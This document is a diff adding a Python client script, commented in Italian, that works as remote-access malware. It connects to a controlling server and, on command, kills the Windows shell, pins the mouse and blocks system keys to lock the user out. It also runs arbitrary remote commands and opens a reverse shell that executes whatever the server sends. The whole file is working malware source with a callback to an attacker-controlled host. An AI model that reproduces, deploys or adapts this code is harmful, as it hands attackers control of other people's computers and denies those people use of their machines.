@@ -1,0 +1,118 @@
+import socket
+import keyboard
+import pyautogui
+import subprocess
+import threading
+import os
+import shlex
+
+SERVER_IP = "127.0.0.1"  # Deve corrispondere all'IP del server
+SERVER_PORT = 87  # Deve corrispondere alla porta del server
+
+unlocked = False
+
+
+# Funzione per bloccare il sistema
+def blocca_sistema():
+    # Blocco dell'explorer
+    subprocess.call(["taskkill", "/f", "/im", "explorer.exe"], shell=True)
+
+    # Blocco di tastiera e mouse
+    while not unlocked:
+        pyautogui.moveTo(0, 0)
+        keyboard.block_key('windows')
+        keyboard.block_key('alt')
+        keyboard.block_key('tab')
+        keyboard.block_key('ctrl')
+        keyboard.block_key('esc')
+
+
+# Funzione per sbloccare il sistema
+def unlock_system():
+    global unlocked
+    if not unlocked:
+        unlocked = True
+        print("[CLIENT] Sistema sbloccato.")
+        subprocess.Popen("explorer.exe", shell=True)  # Riavvia explorer.exe
+
+
+# Funzione per gestire la connessione al server
+def connect_to_server():
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((SERVER_IP, SERVER_PORT))
+        print(f"[CLIENT] Connessione al server stabilita.")
+
+        while not unlocked:
+            comando = client_socket.recv(1024).decode()  # Riceve il comando dal server
+            if comando == "blocca":
+                print("[CLIENT] Esecuzione del blocco del sistema.")
+                blocca_sistema()
+            elif comando == "sblocca":
+                print("[CLIENT] Sistema sbloccato.")
+                unlock_system()
+            elif comando.startswith("exec "):  # Esegui un comando remoto
+                command = comando[5:]  # Rimuove 'exec ' dal comando
+                print(f"[CLIENT] Esecuzione del comando remoto: {command}")
+                execute_command(client_socket, command)
+            else:
+                print("[CLIENT] Comando sconosciuto.")
+
+        client_socket.close()
+    except Exception as e:
+        print(f"[CLIENT] Errore nella connessione al server: {e}")
+
+
+# Funzione per eseguire un comando in reverse shell
+def execute_command(client_socket, command):
+    try:
+        # Esegui il comando e cattura l'output
+        output = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT, shell=False)
+        client_socket.send(output)  # Manda l'output del comando al server
+    except Exception as e:
+        error_message = f"Errore nell'esecuzione del comando: {str(e)}"
+        client_socket.send(error_message.encode())  # Manda l'errore al server
+
+
+# Funzione per stabilire la reverse shell
+def reverse_shell():
+    try:
+        reverse_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        reverse_socket.connect((SERVER_IP, SERVER_PORT))
+        print("[CLIENT] Reverse shell connessa al server.")
+
+        while True:
+            command = reverse_socket.recv(1024).decode()  # Riceve il comando dal server
+            if command.lower() == "exit":
+                print("[CLIENT] Connessione chiusa.")
+                break
+            else:
+                execute_command(reverse_socket, command)
+        reverse_socket.close()
+    except Exception as e:
+        print(f"[CLIENT] Errore nella reverse shell: {e}")
+
+
+# Thread che controlla SHIFT + F1 per sblocco manuale
+def check_hotkey():
+    while not unlocked:
+        if keyboard.is_pressed("shift") and keyboard.is_pressed("f1"):
+            print("[CLIENT] Combinazione di emergenza rilevata: SHIFT + F1")
+            unlock_system()
+            break
+
+
+# Funzione per eseguire il client in un thread separato
+def run_client():
+    threading.Thread(target=connect_to_server, daemon=True).start()
+    threading.Thread(target=reverse_shell, daemon=True).start()
+    threading.Thread(target=check_hotkey, daemon=True).start()
+
+
+if __name__ == "__main__":
+    run_client()
+
+    while True:
+        if unlocked:
+            print("[CLIENT] Sistema sbloccato, puoi fare altro ora.")
+            break
